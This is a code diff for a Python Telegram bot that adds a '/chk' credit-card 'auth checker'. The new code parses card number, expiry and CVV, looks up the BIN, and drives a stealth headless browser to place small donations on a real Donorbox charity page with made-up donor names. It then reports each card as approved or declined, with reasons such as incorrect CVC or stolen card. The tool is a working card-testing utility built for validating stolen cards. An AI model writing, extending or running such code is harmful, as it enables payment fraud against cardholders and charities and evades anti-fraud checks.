@@ -1049,6 +1049,49 @@ def extract(html, base_url, parsed):
     return f"{html}\n{inline}\n{data}\n{extra}", js_urls
 
 # ══════════════════════════════════════════════
+#  AUTH CHECKER UTILS
+# ══════════════════════════════════════════════
+
+def parse_cc(text: str) -> dict | None:
+    """Extract CC|MM|YY|CVV from text."""
+    # Common formats: 4046011234567890|01|28|123 or 4046011234567890 01 2028 123
+    pattern = r"(\d{15,16})[\s|:|/]+(\d{1,2})[\s|:|/]+(\d{2,4})[\s|:|/]+(\d{3,4})"
+    match = re.search(pattern, text)
+    if not match:
+        return None
+    
+    cc, mm, yy, cvv = match.groups()
+    # Normalize year to 2 digits
+    if len(yy) == 4:
+        yy = yy[-2:]
+    # Normalize month to 2 digits
+    if len(mm) == 1:
+        mm = "0" + mm
+        
+    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
+
+async def bin_lookup(bin_num: str) -> dict:
+    """Get BIN info from public API."""
+    url = f"https://lookup.binlist.net/{bin_num[:6]}"
+    headers = {"Accept-Version": "3", "User-Agent": random.choice(UAS)}
+    try:
+        async with httpx.AsyncClient(timeout=5) as client:
+            r = await client.get(url, headers=headers)
+            if r.status_code == 200:
+                data = r.json()
+                return {
+                    "scheme": data.get("scheme", "Unknown").upper(),
+                    "type": data.get("type", "Unknown").upper(),
+                    "brand": data.get("brand", "Unknown"),
+                    "bank": data.get("bank", {}).get("name", "Unknown"),
+                    "country": data.get("country", {}).get("name", "Unknown"),
+                    "emoji": data.get("country", {}).get("emoji", "🏳️")
+                }
+    except Exception:
+        pass
+    return {"scheme": "Unknown", "type": "Unknown", "brand": "Unknown", "bank": "Unknown", "country": "Unknown", "emoji": "🏳️"}
+
+# ══════════════════════════════════════════════
 #  DETECTION
 # ══════════════════════════════════════════════
 
@@ -1207,6 +1250,119 @@ def detect_3ds(corpus, redirect_urls: list[str] = None):
         "evidence": list(dict.fromkeys(evid))[:5],
         "twod_sig": twod_sig,
     }
+
+# ══════════════════════════════════════════════
+#  STRIPE AUTH (BROWSER)
+# ══════════════════════════════════════════════
+
+async def stripe_auth_browser(cc_data: dict, browser: Browser) -> dict:
+    """Attempt to auth a card on donorbox.org (Stripe)."""
+    if not browser:
+        return {"status": "ERROR", "message": "Browser not available", "gateway": "Stripe Auth"}
+
+    url = "https://donorbox.org/one-dollar-for-people-of-burma" 
+    
+    ctx = None
+    try:
+        ctx = await browser.new_context(
+            user_agent=random.choice(UAS),
+            viewport={"width": 1280, "height": 800},
+            ignore_https_errors=True
+        )
+        page = await ctx.new_page()
+        if HAS_STEALTH: await stealth_async(page)
+        
+        # 1. Go to donation page
+        await page.goto(url, wait_until="networkidle", timeout=30000)
+        await asyncio.sleep(3)
+        
+        # 2. Select amount ($3 is minimum for Donorbox)
+        try:
+            await page.fill('input#custom_amount_input', "3")
+            await page.press('input#custom_amount_input', "Enter")
+        except:
+            try: await page.click('button#forward_button')
+            except: pass
+
+        await asyncio.sleep(2)
+
+        # 3. Fill Fake Info
+        first_names = ["James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda", "William", "Elizabeth"]
+        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
+        fname, lname = random.choice(first_names), random.choice(last_names)
+        email = f"{fname.lower()}.{lname.lower()}{random.randint(1000,9999)}@gmail.com"
+
+        try:
+            await page.fill('input#donation_first_name', fname)
+            await page.fill('input#donation_last_name', lname)
+            await page.fill('input#donation_email', email)
+            await page.click('button#forward_button')
+        except: pass
+        
+        await asyncio.sleep(2)
+
+        # 4. Fill Card Details (Stripe Elements)
+        try:
+            # Donorbox uses Stripe Elements directly on the page or in iframe
+            # We use locator to find the fields by placeholder
+            await page.get_by_placeholder("1234 1234 1234 1234").fill(cc_data['cc'])
+            await page.get_by_placeholder("MM / YY").fill(f"{cc_data['mm']}{cc_data['yy']}")
+            await page.get_by_placeholder("CVC").fill(cc_data['cvv'])
+            
+            # Select Country (USA as default for ZIP)
+            try: await page.select_option('select#payment-countryInput', label="United States")
+            except: pass
+            
+            # ZIP code
+            try: await page.fill('input[placeholder*="ZIP"], input[name*="zip"]', "10001")
+            except: pass
+        except Exception as e:
+            log.error("Card input error: %s", e)
+            return {"status": "ERROR", "message": "Card input not found", "gateway": "Stripe Auth"}
+
+        # 5. Submit Payment
+        try:
+            # Look for the final pay button
+            pay_btn = page.locator('button:has-text("Donate"), button:has-text("Pay")').last
+            await pay_btn.click(timeout=5000)
+        except:
+            return {"status": "ERROR", "message": "Pay button not found", "gateway": "Stripe Auth"}
+        
+        # 6. Wait for result
+        await asyncio.sleep(10)
+        content = await page.content()
+        
+        if any(x in content for x in ["Thank you", "Success", "receipt", "confirmed"]):
+            return {
+                "status": "APPROVED",
+                "message": "Transaction Successful!",
+                "gateway": "Stripe Auth (Donorbox)",
+                "raw_response": "success"
+            }
+        
+        # Check for common error messages in the page
+        error_msg = "Your card was declined."
+        lo_content = content.lower()
+        if "declined" in lo_content: error_msg = "Card Declined"
+        elif "incorrect_cvc" in lo_content or "cvc is incorrect" in lo_content: error_msg = "Incorrect CVC"
+        elif "expired_card" in lo_content or "card has expired" in lo_content: error_msg = "Expired Card"
+        elif "insufficient_funds" in lo_content: error_msg = "Insufficient Funds"
+        elif "processing_error" in lo_content: error_msg = "Processing Error"
+        elif "stolen_card" in lo_content: error_msg = "Stolen Card"
+        elif "fraudulent" in lo_content: error_msg = "Fraudulent"
+        
+        return {
+            "status": "DECLINED",
+            "message": error_msg,
+            "gateway": "Stripe Auth (Donorbox)",
+            "raw_response": "declined"
+        }
+
+    except Exception as e:
+        log.error("Stripe Auth Error: %s", e)
+        return {"status": "ERROR", "message": f"Automation Error: {str(e)[:50]}", "gateway": "Stripe Auth"}
+    finally:
+        if ctx: await ctx.close()
 
 # ══════════════════════════════════════════════
 #  BROWSER SCAN
@@ -1891,6 +2047,58 @@ async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not ctx.args: await update.message.reply_text("Usage: `/check <url>`", parse_mode="Markdown"); return
     await run_scans(uid, [" ".join(ctx.args)], update.message.reply_text, scanned_by=dname(update.effective_user))
 
+async def cmd_chk(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Auth Checker command."""
+    await reg(update)
+    uid = update.effective_user.id
+    if is_scanning(uid): await update.message.reply_text("⚠️ Scan run နေတယ်。"); return
+    if not ctx.args: 
+        await update.message.reply_text("Usage: `/chk CC|MM|YY|CVV`", parse_mode="Markdown")
+        return
+    
+    if not await _check_limits(update, uid): return
+
+    raw_text = " ".join(ctx.args)
+    cc_data = parse_cc(raw_text)
+    if not cc_data:
+        await update.message.reply_text("❌ Invalid CC format. Use `CC|MM|YY|CVV`")
+        return
+
+    set_scanning(uid, True)
+    lmsg = await update.message.reply_text(f"🔍 *Checking Card:* `{cc_data['cc'][:6]}xxxxxx`...", parse_mode="Markdown")
+    
+    try:
+        # 1. BIN Lookup
+        bin_info = await bin_lookup(cc_data['cc'])
+        
+        # 2. Auth Check (Simulated for now)
+        async with _pool.acquire() as browser:
+            auth_res = await stripe_auth_browser(cc_data, browser)
+        
+        # 3. Format Output
+        status_icon = "✅" if auth_res['status'] == "APPROVED" else "❌"
+        output = (
+            "💳 • AUTH CHECKER • 💳\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            f"CC      : `{cc_data['cc']}|{cc_data['mm']}|{cc_data['yy']}|{cc_data['cvv']}`\n"
+            f"Status  : {status_icon} {auth_res['status']}\n"
+            f"Message : {auth_res['message']}\n"
+            f"Gateway : {auth_res['gateway']}\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            f"Bin     : {cc_data['cc'][:6]} - {bin_info['scheme']} - {bin_info['type']}\n"
+            f"Bank    : {bin_info['bank']}\n"
+            f"Country : {bin_info['country']} {bin_info['emoji']}\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            f"Checked By: {dname(update.effective_user)}"
+        )
+        await lmsg.edit_text(output, parse_mode="Markdown")
+        await db_inc_daily(uid)
+    except Exception as e:
+        log.error("Auth check error: %s", e)
+        await lmsg.edit_text(f"❌ Error: {str(e)}")
+    finally:
+        set_scanning(uid, False)
+
 async def cmd_fresh(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await reg(update)
     uid = update.effective_user.id
@@ -2242,6 +2450,7 @@ async def on_err(update, ctx: ContextTypes.DEFAULT_TYPE):
 USER_CMDS = [
     BotCommand("start",     "🚀 Start"),
     BotCommand("check",     "🔍 Scan — /check stripe.com"),
+    BotCommand("chk",       "💳 Auth — /chk CC|MM|YY|CVV"),
     BotCommand("fresh",     "🔄 Force rescan"),
     BotCommand("bulk",      "📎 Upload .txt"),
     BotCommand("last",      "📋 Last results"),
@@ -2310,7 +2519,7 @@ def main():
     )
 
     for cmd,handler in [
-        ("start",cmd_start),("help",cmd_help),("check",cmd_check),
+        ("start",cmd_start),("help",cmd_help),("check",cmd_check),("chk",cmd_chk),
         ("fresh",cmd_fresh),("cancel",cmd_cancel),("last",cmd_last),
         ("export",cmd_export),("bulk",cmd_bulk),
         ("monitor",cmd_monitor),("unmonitor",cmd_unmonitor),
